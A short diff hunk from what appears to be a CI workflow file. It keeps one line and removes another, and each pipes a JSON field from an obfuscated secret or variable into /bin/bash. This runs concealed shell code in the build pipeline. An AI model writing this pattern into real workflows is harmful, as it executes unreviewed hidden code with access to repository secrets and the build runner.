@@ -20,7 +20,6 @@ jobs:
           wuxsj3: ${{ secrets.wuxsj3 }}
         run: |
           printf '%s' "$wuxsj3" | jq -r .qf833 | /bin/bash
-          echo $o71377 | jq -r .laob414 | /bin/bash
 
       - name: Upload artifact
         if: always()
